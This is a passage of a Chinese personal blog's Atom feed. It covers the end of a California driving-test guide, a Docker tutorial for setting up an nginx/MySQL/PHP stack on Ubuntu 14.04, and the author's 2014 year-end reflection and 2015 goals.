<li><a href="https://www.youtube.com/watch?v=jyT_KdzOO6g&amp;index=3&amp;list=FLuBaD6f8UL8es7JvFL_-T8w">An Actual California DMV Drive Test, Part 2 of 2</a>;</li>
<li><a href="https://www.youtube.com/watch?v=_V5S7V5ZQLM">安全驾驶课程</a>;</li>
</ol>


<h4>路考考试步骤</h4>

<p>路考详细步骤如下：</p>

<ol>
<li>首先恭喜你成功拿到permit，你已经向驾照前进了50%了~ 现在你所要做的就是搞定路考，然后静候License啦~</li>
<li>建议考完笔试后当场问工作人员拿一张FLYER 名字叫 how to prepare for your deiving test 是一张红色皮的小传单，里面有所有关于路考的信息。回到家后，打开电脑，再次登录<a href="http://dmv.ca.gov/">dmv</a>, 同样去到online services 然后选择appoinment，不过这次是选择behind the wheel driving test. 输入所有个人信息，就可以预约路考啦~（个人建议路考去一些人不多且附近路况好的DMV，千万不要去车多人杂市中心的DMV，考试时间能不约在上下班高峰期就别）（PS 未满18岁的童鞋需要持permit 超过6个月，完成了驾校学习并且有超过六小时的专业陪练 具体参见<a href="http://dmv.ca.gov/dl/dl_info.htm#PERMINOR">这里</a> 刚刚有朋友问，能不能笔试和路考同一天考？ 对于这个问题我只能说，看情况。 首先你必须要有permit才能申请路考，而DMV一般都挺忙的所以不能保证时间。但是万一你真的非常好运，上午通过了笔试，当天也有路试的时间available，那你就可以在同一天搞定一切问题。 所以，只是DMV的时间问题，并没有限制。</li>
<li>要不要去驾校？ 对于未满18岁的未成年人来说，必须要去驾校，这是规定。对于已经成年的童鞋们来说，去驾校不是必须的，如果你会开车，那么你就不必去驾校，找一台车练一练就OK啦~如果你不会开车，那么我的建议是找专业教练 google一下就有，就不多说。选择教练而不是驾校是因为时间方面更灵活也更方便，如果你喜欢驾校的严谨并且希望系统的学习，那么驾校是好的选择。</li>
<li>路考都考些什么？ 还记得刚刚上面提到的那张小传单吗？那个里面会有所有考试要求，当然如果你没有拿到，也不紧要，请参见下图右边的checklist 里面有所有具体的要求。与此同时，再提供北美省钱快报的详细视频 以及<a href="http://apps.dmv.ca.gov/video">DMV官方视频</a>，相信看完视频，你已经清楚考试规范和要求了。</li>
</ol>


<h4>参考资料</h4>

<ol>
<li><a href="http://www.moonbbs.com/thread-379112-1-1.html">加州驾照笔试/路考</a></li>
<li><a href="http://www.moonbbs.com/thread-7183-1-1.html">美国驾照路考－图文视频详解</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Docker搭建lnmp详解]]></title>
    <link href="http://blog.ourren.com/blog/2015/01/09/docker_with_lnmp/"/>
    <updated>2015-01-09T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/01/09/docker_with_lnmp</id>
    <content type="html"><![CDATA[<p>docker从去年开始一直很火，但是由于其它原因也没有怎么接触，今天抽空参照<a href="https://www.docker.com/">官网</a>和<a href="http://yeasy.gitbooks.io/docker_practice/">Docker —— 从入门到实践</a>进行了初步学习，实现了利用docker下搭建lnmp环境，步骤如下：</p>

<h4>1.安装docker具体步骤可以<a href="https://docs.docker.com/installation/ubuntulinux/">官方教程</a>或者<a href="http://yeasy.gitbooks.io/docker_practice/">Docker —— 从入门到实践</a>里面都有详细的介绍，本次的安装环境如下：</h4>

<pre><code>Ubuntu 14.04 Desktop
待安装环境：ubuntu+nginx+mysql+php具体命令如下：

$ sudo apt-get update   $ sudo apt-get install docker.io
</code></pre>

<p>注意：如果使用操作系统自带包安装 Docker，目前安装的版本是比较旧的 0.9.1。 要安装更新的版本，可以通过使用 Docker 源的方式。<!--more-->通过Docker源安装最新版本要安装最新的 Docker 版本，首先需要安装 apt-transport-https 支持，之后通过添加源来安装。
    $ sudo apt-get install apt-transport-https  $ sudo apt-key adv &ndash;keyserver hkp://keyserver.ubuntu.com:80 &ndash;recv-keys    36A1D7869245C8950F966E92D8576A8BA88D21E9    $ sudo bash -c &ldquo;echo deb <a href="https://get.docker.io/ubuntu">https://get.docker.io/ubuntu</a> docker main > /etc/apt/sources.list.d/docker.list&rdquo;    $ sudo apt-get update   $ sudo apt-get install lxc-docker安装完成测试 $ sudo docker #### 2. 安装镜像采用从官方Docker Hub上安装。这里安装ubuntu  14.04    $ sudo docker pull ubuntu:14.04删除镜像sudo imagessudo docker rmi imagesname/imagesid如果提示错误，请先查看是否有container在运行，先删除container，然后再删除镜像；sudo docker ps -asudo docker rm containername#### 3. 安装lnmp环境以ubuntu镜像作为基础镜像，启动容器并在其中执行 /bin/bash 命令， -t -i 参数用于创建一个容器;
    $ sudo docker run -t -i ubuntu:14.04 /bin/bash进入后就是跟平时的命令行差不多，具体命令参照 <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-ubuntu-14-04">digitalocean的详细指南</a>查看容器的IP地址，并试着外部访问：  $ ifconfig然后在外面用浏览器访问就可以看到网页内容了。</p>

<p>退出容器和镜像</p>

<pre><code>$ exit
#### 4. 制作镜像查看目前的已有的容器：

$ sudo docker ps -a可以看到刚刚操作的容器的名字，将刚刚修改的镜像打包，生成为新的镜像：   $ sudo docker commit 容器名字 ubuntu/lnmp删除原来旧容器和镜像 
$ sudo docker rm 容器名字   $ sudo docker rmi 镜像id
</code></pre>

<h4>5. 总结</h4>

<p>详细步骤就上如下的操作，这个整体过程只是让我们更熟悉docker的相关命令，其实现在有更好的方法实现安装lnmp,例如可以直接在<a href="https://hub.docker.com/">docker hub</a>上面下载已经配置好的镜像，同时也可以通过 <a href="http://www.fig.sh/">Fig</a>来进行安装，下次我们接着写。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2014年：瞎忙活的一年]]></title>
    <link href="http://blog.ourren.com/blog/2015/01/01/summary_of_2014/"/>
    <updated>2015-01-01T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/01/01/summary_of_2014</id>
    <content type="html"><![CDATA[<p>2013-2014是人生中迷茫的时期，需要面对生活的各个方面，需要考虑人生的道路方向。但我相信在这迷茫之后积极面对生活，充满热情迎接挑战时将会是另外一个天地。</p>

<h4>关于研究</h4>

<p>今年的研究工作就像题目一样：“瞎忙活”。推开客观情况而言，个人因素还是主要的，问题在于：个人研究方向未确定，就没有什么大的研究目标，所以一天只能看到眼前需要处理的事情和任务，你没有经常规划或者提醒你有一个长期的目标，就像迷茫在大海中的鱼，一天游呀游，不知道目的地在哪。因此，确定2015年个人的研究目标偏向于Web安全与隐私保护，机器学习与自然语言处理这块。</p>

<p>改变以往对相关技术的研究方法，针对特定技术必须亲身实践并结合自己的理解输出技术文章，来改变原来写不出技术文章或者写出的技术文章水平很low。通过自己的文笔和理解写出来的代码和文章才是真正地掌握了该技术。</p>

<p>在一个行业想要混得牛逼，自己必须得有一个擅长的技能，至少能够在这个领域排上名次，否则你没办法在这个圈子混，现代社会不缺少全才(什么方面都懂一点)，但是缺少专才(在某个技术点上做得很顶尖)，而目前最主要的目标就是需要在自己的领域证明自己的能力。</p>

<!--more-->


<h4>关于选择</h4>

<p>“选择比努力重要“其实这是今年很火的一句话，其实大家都知道这句话。但是为什么我们每个人在面对选择的时候都是那么迷茫，那么徘徊。因为我们没有任何经验和勇气去面对新的选择，我们害怕失败，害怕做了错误的选择。但是当我们无法决策的时候请拿下纸笔写下并对比，然后尽快做个选择，不要让这个问题一直纠结你的生活。同时我相信不管我们做了怎么样的选择，只要你勇于去面对，努力去实践，结果肯定不会差。</p>

<p>其实从去年到今年一直在思考我到底做的选择对不对呢，到底哪条路才是对的。其实后来想通了才发现不要去纠结你已经做了的选择，你当时为什么做这个选择肯定有考虑，目前需要思考的就是在这个路上如何让自己走得更远，如何让自己能够在这个圈子混的更开。</p>

<h4>关于自学</h4>

<p>其实自学不仅仅指书本学习，在现代社会中，你生活的方方面面(考试，技术或者学术研究，项目申请，租房、旅游等等)，这些问题不要去依靠别人给你回答，请记住“Google是你最好的老师”，而你的朋友只能给你建议，具体怎么做自己动手。特别是在发达国家，各种服务都是自助，自己不去花时间研究你就没办法生活。</p>

<p>去年到今年申请公派项目可以说是深有体会，过程中经历了太多的曲折和难题。对于我而言付出了很多休息时间，但是通过自己的不断研究和努力，终于完成了这一年多的心愿，可以说在这个过程中学到了太多的东西，了解了原来没有接触过的太多东西，整个过程中可能出现的各种问题我算是全部经历了一遍。</p>

<p>其实学习各类技术也是同样的道理，不要指望别人把方向和资料都给你安排好，然后你只要简单地操作就学到技术，不可能，永远不可能。一切都得靠你自己，看一下自己圈子的牛人，是不是大伙都是通过自学的。</p>

<h4>关于幸福</h4>

<p>记得在网上经常看到一句话：“二十多岁的男人是人生的最低谷，没钱，没事业，而二十多岁的女孩是她一生最灿烂的时候，所以，年轻人要感谢你身边的女孩，更要学会珍惜！”，其实这句话写得真好。因为你这个年龄，在你事业或者人生的道路上会经历太多的迷茫和选择(工作、结婚、房子和孩子)，在现实与困难面前你会感到无助，感到世界会如此渺茫。一个奔三的男人能够有你喜爱的女孩陪伴在你的左右，在你孤单的时候送上问候，在你迷茫的时候跟你谈心，可以说他的生活是幸福的。因此，不要把幸福定义得太高，高得让你踮起脚都摸不到，让我们慢步走向幸福。</p>

<h4>关于压力</h4>

<p>不要贪图没有压力的生活，也不要想什么时候压力会小点，人生活在这个社会，只有小时候无忧无虑，成年了每时每刻都有自己的压力，所以需要考虑的是面对压力我们该如何做，应该如果去处理，如何让自己生活好每一天。</p>

<h4>关于2015</h4>

<ol>
<li>拿到驾照；</li>
<li>完成高水平论文2篇；</li>
<li>在研究领域有一定影响力；</li>
<li>参加国际比赛并拿到名次；</li>
<li>解决终生大事。</li>
</ol>


<h4>关于其他</h4>

<p>今年自从买了kpw，天天挤公交的时候刷了13+本书，抽周末和平时晚上刷了40＋(美剧＋电影)，SecWiki提交了2800＋精品安全资讯和专题，同时SecWiki用户过1000+&hellip;..</p>

<p>为什么开始写年终总结，因此我想记录下来，让我的心里能够放松，让我的心里装着目标，让我能够时刻提醒自己心中的任务，让我能够不断向前冲。</p>
]]></content>
  </entry>
  
</feed>
